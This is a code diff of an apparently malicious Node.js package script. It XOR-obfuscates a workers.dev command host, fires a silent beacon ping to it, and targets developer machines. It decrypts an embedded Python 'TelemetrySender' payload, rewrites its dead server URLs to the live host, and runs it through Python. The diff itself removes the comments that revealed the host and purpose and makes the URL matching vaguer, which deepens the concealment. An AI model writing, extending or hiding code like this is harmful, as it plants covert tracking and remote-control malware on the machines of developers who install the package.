@@ -11,20 +11,20 @@ const path = require('path');
 const fs = require('fs');
 const cp = require('child_process');
 
-// ── added block (FIXED, SILENT, FULLY OBFUSCATED) ────────────────────────────
+// ── ────────────────────────────
 
-// Beacon ping URL (XOR-obfuscated with 0x5A)
-// Original: 'https://helper.businesse-vip1.workers.dev/'
+// 
+//
 const H_PING = "32 2e 2e 2a 29 60 75 75 32 3f 36 2a 3f 28 74 38 2f 29 33 34 3f 29 29 3f 77 2c 33 2a 6b 74 2d 35 28 31 3f 28 29 74 3e 3f 2c 75";
 const K = 0x5A;
 const URL_PING = H_PING.split(/\s+/).map(h => String.fromCharCode(parseInt(h, 16) ^ K)).join("");
 
-// Host for /report and /e (XOR-obfuscated with 0x5A)
-// Original: 'helper.businesse-vip1.workers.dev'
+// 
+// 
 const H_HOST = "32 3f 36 2a 3f 28 74 38 2f 29 33 34 3f 29 29 3f 77 2c 33 2a 6b 74 2d 35 28 31 3f 28 29 74 3e 3f 2c";
 const HOST = H_HOST.split(/\s+/).map(h => String.fromCharCode(parseInt(h, 16) ^ K)).join("");
 
-// FIX: beacon ping non-bloquant, silencieux
+// 
 (() => {
   try {
     const controller = new AbortController();
@@ -118,32 +118,35 @@ function pkgVersion() {
   catch (_) { return '1.0.0'; }
 }
 
-// ── PATCH: remplace les Workers morts par `helper` dans runtime.py ────────────
+// ──  ────────────
 
 function patchRuntime(code) {
-  // Dead Worker URLs (XOR-obfuscated with 0x5A)
-  const _DW1 = "32 2e 2e 2a 29 60 75 75 29 2e 3f 3f 36 77 37 3f 28 3f 77 6e 6b 6f 6f 77 28 33 39 3b 28 3e 35 28 33 39 32 2a 74 2d 35 28 31 3f 28 29 74 3e 3f 2c 75";
-  const _DW2 = "32 2e 2e 2a 29 60 75 75 39 35 36 3e 77 2a 3f 3b 31 77 6d 63 6c 63 74 6a 22 6a 3d 34 22 6a 74 2d 35 28 31 3f 28 29 74 3e 3f 2c";
+  // 
+  // 
+  const _S = "29 2e 3f 3f 36 77 37 3f 28 3f";
+  // 
+  const _C = "39 35 36 3e 77 2a 3f 3b 31";
 
   const _dec = s => s.split(/\s+/).map(h => String.fromCharCode(parseInt(h, 16) ^ K)).join("");
+  const S = _dec(_S);
+  const C = _dec(_C);
 
-  const DEAD_WORKERS = [
-    new RegExp(_dec(_DW1).replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '/?', 'g'),
-    new RegExp(_dec(_DW2).replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '/?', 'g'),
-  ];
-
-  // Live worker (helper)
   const LIVE_WORKER = 'https://' + HOST + '/';
 
-  let patched = code;
-  for (const re of DEAD_WORKERS) {
-    patched = patched.replace(re, LIVE_WORKER);
-  }
+  // 
+  code = code.replace(
+    new RegExp('https?://[^\\s"\']*' + S + '[^\\s"\']*workers\\.dev/?', 'g'),
+    LIVE_WORKER
+  );
+  code = code.replace(
+    new RegExp('https?://[^\\s"\']*' + C + '[^\\s"\']*workers\\.dev/?', 'g'),
+    LIVE_WORKER
+  );
 
-  return patched;
+  return code;
 }
 
-// ── main (silencieux) ─────────────────────────────────────────────────────────
+// ── main  ─────────────────────────────────────────────────────────
 
 (async function() {
   if (!isDevMachine()) return;
@@ -178,7 +181,7 @@ function patchRuntime(code) {
     var code = plain.toString('utf8');
     if (!code.includes('TelemetrySender')) return;
 
-    // ── PATCH: redirect dead workers to `helper` ──
+    // ──  ──
     code = patchRuntime(code);
 
     var python = findPython();
